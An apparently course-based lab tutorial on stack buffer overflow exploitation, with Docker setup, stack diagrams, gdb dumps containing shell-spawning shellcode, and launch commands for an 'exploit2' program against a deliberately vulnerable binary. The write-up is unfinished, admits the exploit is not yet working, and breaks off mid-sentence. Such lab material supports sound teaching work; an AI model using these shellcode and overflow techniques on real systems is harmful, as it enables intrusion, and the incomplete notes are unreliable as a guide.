### Exploiting

In this tutorial we'll review how to proceed with a buffer overflow and exploit it.

Content is heavily based on [1]:

----

**Note**: as in previous tutorials, there's a docker container that facilitates reproducing the work of this tutorial. The container can be built with:
```bash
docker build -t basic_cybersecurity3:latest .
```
and run with:
```bash
docker run --privileged -it basic_cybersecurity3:latest
```

----

We'll be using two binaries `vulnerable` (the vulnerable program which takes a parameter) and `exploit2`, a program that takes as a parameter a buffer size, and an offset from its own stack pointer (where we believe the buffer we want to
overflow may live).

An introduction to exploit2 is provided at [2]. They way things work in a simple way is, `exploit2` launches pushes the content of `buff` to an environmental variable called `EGG` and just afterwards, launches a shell with this environmental variable active. Within the shell, we launch `vulnerable` and use `$EGG` as a parameter.
The trick here is that when constructing `buff` in `exploit2`, we obtain the stack pointer (`esp` in i386) of that binary
and substract an arbitrary number we define from it to obtain the address that will be written after the shellcode. This way, we end up with something like this *in the heap* (note that `buff` lives in the *heap*):

```
                              /----------------------\  lower
                              |        shellcode     |  memory
                              |                      |  addresses
                              |----------------------|
                              |                      |
                            | | esp - arbitrary num. |
                    growth  | |                      |
                  direction v |-.-.-.-.-.-.-.-.-.-.-.|
                              |                      |
                              | esp - arbitrary num. |
                              |                      |
                              |-.-.-.-.-.-.-.-.-.-.-.|
                              |                      |
                              | esp - arbitrary num. |
                              |                      |
                              |-.-.-.-.-.-.-.-.-.-.-.|
                                        ...
```
As pointed out, this content gets pushed to the environmental variable `EGG`.

Now, when we launch a shell and subsequently, launch `vulnerable` within the shell our stack is growing as follows:

```
                              /------------------\  higher
                              |                  |  memory
                              |                  |  addresses
                              |------------------|
                              |                  |
                            | |  Stack exploit2  | esp = 0xffffd740
                    growth  | |                  |
                  direction v |-.-.-.-.-.-.-.-.-.|
                              |                  |
                              |    Stack bash    | esp = 0xffffd5a8
                              |                  |
                              |-.-.-.-.-.-.-.-.-.|
                              |                  |
                              | Stack vulnerable | esp = 0xffffd0c0
                              |                  |
                              |-.-.-.-.-.-.-.-.-.|
                              |                  |
                              |       ...        |
                              |                  |                                                            
                              |------------------|
```

*Note: These numbers will only appear when running each binary with GDB. If not, the stack pointer of `exploit2` will appear with weird values like `0xffde5688` and so on.*

What this tells us is that making some simple math `0xffffd740 - 0xffffd0c0 = 1664` we can figure out the offset address needed. In other words, if we substract `1664` to the `esp` value of `exploit2`, we could point to the bits of the `vulnerable`'s stack pointer and pretty much do with it what we want if we overflow the buffer `buffer` of `vulnerable`.

*Note: for some reason, the number needed to get the right address in the stack is not 1664 but 8 bits less: 1656. Not sure why.*

We can double check this by printing the memory of `buff` and `buffer` while debugging `exploit2` and `vulnerable` respectively:

```
pwndbg> p buff
$1 = 0x804b008 "EGG=\353\037^\211v\b1\300\210F\a"...
pwndbg> x/100wx 0x0804b008
0x804b008:	0x3d474745	0x895e1feb	0xc0310876	0x89074688
0x804b018:	0x0bb00c46	0x4e8df389	0x0c568d08	0xdb3180cd
0x804b028:	0xcd40d889	0xffdce880	0x622fffff	0x732f6e69
0x804b038:	0xffffd068	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b048:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b058:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b068:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b078:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b088:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b098:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b0a8:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b0b8:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b0c8:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b0d8:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b0e8:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b0f8:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b108:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b118:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b128:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b138:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b148:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b158:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b168:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b178:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0x804b188:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
```

```
pwndbg> p argv[1]
$3 = 0xffffd493 "\353\037^\211v\b1\300\210F\a\211F\f\260"..
pwndbg> x/100wx 0xffffd493
0xffffd493:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
0xffffd4a3:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
0xffffd4b3:	0xffdce880	0x622fffff	0x732f6e69	0xffffd068
0xffffd4c3:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd4d3:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd4e3:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd4f3:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd503:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd513:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd523:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd533:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd543:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd553:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd563:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd573:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd583:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd593:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd5a3:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd5b3:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd5c3:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd5d3:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd5e3:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd5f3:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd603:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0
0xffffd613:	0xffffd0c0	0xffffd0c0	0xffffd0c0	0xffffd0c0

```

*Note: the first 4 bits of the dump in `exploit2` don't match because correspond with the string "EGG="*

Note that `0xffffd0c0` is appended after the shellcode which aims to overwrite the return address of `vulnerable` to jump into the beginning of the stack pointer `esp` which is where the overflowed buffer begins which the malici

Before the following instructions in `vulnerable`:
```C
5     strcpy(buffer,argv[1]);
```

the content of `buffer` should be:

```
pwndbg> p &buffer
$2 = (char (*)[512]) 0xffffd0c0
pwndbg> x/100wx 0xffffd0c0 # similar to "x/100wx &buffer"
0xffffd0c0:	0x00000070	0xf7feff96	0xf7fe933d	0xf7fe1f60
0xffffd0d0:	0xf7fd8241	0xf7f6d298	0xf7ffd53c	0xf7fe4017
0xffffd0e0:	0xf7ffc000	0x00001000	0x00000001	0x03ae75f6
0xffffd0f0:	0xf7ffdad0	0xf7fd5780	0xf7fe1e39	0xf7fd8128
0xffffd100:	0x00000007	0xf7ffdc08	0x6e43a318	0xf7fe263d
0xffffd110:	0x00000000	0x00000000	0xf7fd81a0	0x00000007
0xffffd120:	0xf7fd81c0	0xf7ffdc08	0xffffd17c	0xffffd178
0xffffd130:	0x00000001	0x00000000	0xf7ffd000	0xf7f6d2a2
0xffffd140:	0x6e43a318	0xf7fe1f60	0xf7e252e5	0x0804825e
0xffffd150:	0xf7fd81a0	0x03721d18	0xf7ff5ac4	0xffffd208
0xffffd160:	0xf7ff39f3	0x0d696910	0xf7ffd000	0x00000000
0xffffd170:	0xf7fe1e39	0xf7e15d14	0x000008ea	0xf7fd51b0
0xffffd180:	0xf63d4e2e	0xf7fe263d	0x00000001	0x00000001
0xffffd190:	0xf7e1edc8	0x000008ea	0xf7e1f618	0xf7fd51b0
0xffffd1a0:	0xffffd1f4	0xffffd1f0	0x00000003	0x00000000
0xffffd1b0:	0xf7ffd000	0x0804823d	0xf63d4e2e	0xf7e15f12
0xffffd1c0:	0x000008ea	0xf7e1f618	0xf7e1edc8	0x07b1ea71
0xffffd1d0:	0xf7ff5ac4	0xffffd280	0xf7ff39f3	0xf7fd5470
0xffffd1e0:	0x00000000	0x00000000	0xf7ffd000	0xf7ffdc08
0xffffd1f0:	0x00000000	0x00000000	0x00000000	0xffffd28c
0xffffd200:	0xf7fe1fc9	0x00000000	0xf7ffdad0	0xffffd288
0xffffd210:	0xffffd2d0	0xf7fe2b4b	0x080481fc	0xffffd288
0xffffd220:	0xf7ffda74	0x00000001	0xf7fd54a0	0x00000001
0xffffd230:	0x00000000	0x00000001	0xf7ffd918	0x00f0b5ff
0xffffd240:	0xffffd27e	0x00000001	0x000000c2	0xf7ea26bb
```

stepping through this instruction, the content of `buffer` becomes:

```
pwndbg> p &buffer
$2 = (char (*)[512]) 0xffffd0c0
0xffffd0c0:	0x00000070	0xf7feff96	0xf7fe933d	0xf7fe1f60
0xffffd0d0:	0xf7fd8241	0xf7f6d298	0xf7ffd53c	0xf7fe4017
0xffffd0e0:	0xf7ffc000	0x00001000	0x00000001	0x03ae75f6
0xffffd0f0:	0xf7ffdad0	0xf7fd5780	0xf7fe1e39	0xf7fd8128
0xffffd100:	0x00000007	0xf7ffdc08	0x6e43a318	0xf7fe263d
0xffffd110:	0x00000000	0x00000000	0xf7fd81a0	0x00000007
0xffffd120:	0xf7fd81c0	0xf7ffdc08	0xffffd17c	0xffffd178
0xffffd130:	0x00000001	0x00000000	0xf7ffd000	0xf7f6d2a2
0xffffd140:	0x6e43a318	0xf7fe1f60	0xf7e252e5	0x0804825e
0xffffd150:	0xf7fd81a0	0x03721d18	0xf7ff5ac4	0xffffd208
0xffffd160:	0xf7ff39f3	0x0d696910	0xf7ffd000	0x00000000
0xffffd170:	0xf7fe1e39	0xf7e15d14	0x000008ea	0xf7fd51b0
0xffffd180:	0xf63d4e2e	0xf7fe263d	0x00000001	0x00000001
0xffffd190:	0xf7e1edc8	0x000008ea	0xf7e1f618	0xf7fd51b0
0xffffd1a0:	0xffffd1f4	0xffffd1f0	0x00000003	0x00000000
0xffffd1b0:	0xf7ffd000	0x0804823d	0xf63d4e2e	0xf7e15f12
0xffffd1c0:	0x000008ea	0xf7e1f618	0xf7e1edc8	0x07b1ea71
0xffffd1d0:	0xf7ff5ac4	0xffffd280	0xf7ff39f3	0xf7fd5470
0xffffd1e0:	0x00000000	0x00000000	0xf7ffd000	0xf7ffdc08
0xffffd1f0:	0x00000000	0x00000000	0x00000000	0xffffd28c
0xffffd200:	0xf7fe1fc9	0x00000000	0xf7ffdad0	0xffffd288
0xffffd210:	0xffffd2d0	0xf7fe2b4b	0x080481fc	0xffffd288
0xffffd220:	0xf7ffda74	0x00000001	0xf7fd54a0	0x00000001
0xffffd230:	0x00000000	0x00000001	0xf7ffd918	0x00f0b5ff
0xffffd240:	0xffffd27e	0x00000001	0x000000c2	0xf7ea26bb
```

which seems unchanged. Something's not quite working. **Follow from here**.

Let's launch `exploit2`:
```bash
# Terminal 1
./exploit2 600 1564
gdb --args ./vulnerable $EGG

```

### Bibliography
- [1] A. One (1996). Smashing the Stack for Fun and Profit. Phrack, 7. Retrieved from http://insecure.org/stf/smashstack.html.
- [2] Basic stack overflow experimentation. Retrieved from https://github.com/vmayoral/cybersecurity_specialization/tree/master/software_security/week1.
